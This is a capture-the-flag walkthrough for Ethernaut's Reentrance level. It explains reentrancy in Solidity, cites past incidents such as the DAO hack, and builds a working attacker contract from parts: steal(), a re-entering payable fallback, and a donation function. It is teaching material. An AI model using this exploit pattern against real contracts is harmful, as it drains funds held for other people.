# Ethernaut Walkthrough: Re-entrancy
## Welcome to KweenBirb's 11th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to Reentrance.sol, the 11th challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in the root directory and .sol file in this directory. Let's begin!

In this challenge, Ethernaut instructs us 'to steal all the funds from the contract.' Not at all befitting the white hat hackery we're supposed to be learning! Sometimes you have to learn the hard way, I guess.

## On the history of reentrancy

Reentrance exploits litter the history of programmable blockchains, dating all the way back to the big $60 million DAO hack that happened in 2016. At the time, I recall online forums and communities like reddit being ablaze with misunderstanding and FUD about its implications. Many in the (admittedly, less informed) bitcoin community thought it was the end of Ethereum- despite it having just launched! Here's a great blog post on the DAO hack:

https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/

Other notable hacking incidents involving reentrance hacks affected protocols like Uniswap (2020), Cream Finance (2021), Synthetix (2019), and SpankChain (2018). Thankfully we've learned a lot about smart contract security in the years following and agreed upon a code pattern to defend against it.

## What is reentrancy?

Reentrant exploits are a pattern of code execution that involve two main factors:
1. an external call to an untrustworthy contract
2. an action that is executed before its effect on state is updated

This pattern reappears in many different forms but at the highest, most abstract level those are the two factors that are required. This is because when the external call to an outside contract is made (1.), execution context is handed to that contract! It can then maliciously 're-enter' by injecting ANOTHER call of the same function, which then restarts the process and starts a loop!

However, this vulnerability is blocked if the original contract updates its state with the effect of the external call BEFORE the external call is actually executed. Confused? Let's move on from the abstraction.

## Time to get concrete

Looking over the Ethernaut instance contract, we see that the scenario I just described is present. There's an external call in the withdraw() function that happens 4 lines BEFORE that call's effect on state is updated:

```
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
}
```

This contract is vulnerable to reentrancy! Maybe that's why Ethernaut named it Reentrance. Lol.

Our goal then is to call the withdraw function from our own malicious contract, instigating this call:

```(bool result,) = msg.sender.call{value:_amount}("");```

back to our contract, which will need a payable fallback function to both accept the ether sent and re-enter by initiating another call to the instance's withdraw() function.

To do so, let's begin by implementing the initial call:

```
function steal() public {
    reentrance.withdraw( amount );
}
```

And then implement the fallback function that will continuously re-enter by initiating another withdraw():

```
fallback() external payable {
    reentrance.withdraw( amount );
}
```

Keep in mind that the fallback must be payable as it will be receiving the ether amount (which we will next specify in storage).

That's pretty much it as far as the reentrance exploit goes. Short and sweet, huh?

## But wait! We forgot something. 

Before we can withdraw at all, we need to satisfy the balances[msg.sender] check in the withdraw() function:

```if(balances[msg.sender] >= _amount)```

To do so, we can raise our balance in the instance's storage mapping by giving our contract a way to use the handy deposit() function provided by Ethernaut.

```
function give() public {
    address to = address(this);
    reentrance.donate{ value: amount }(to);
}
```

## Implement the lock and load

All that's left before we execute our first reentrance hack is to specify the target and an amount of our choosing to donate and subsequently steal. There are of course many ways to do so but here's an example using an interface and convenient amount, all taken from the Solution.sol contract in this directory:

```
interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external returns (uint);
    function withdraw(uint _amount) external;
}

contract Reenter {
    Reentrance reentrance;
    uint amount = 500000000000000;

    constructor(address $your_ethernaut_instance_here) payable {
        reentrance = Reentrance($your_ethernaut_instance_here);
    }

    // give, steal, and fallback functions 
}
```

Hack away, frens! 
○•○ h00t h00t ○•○
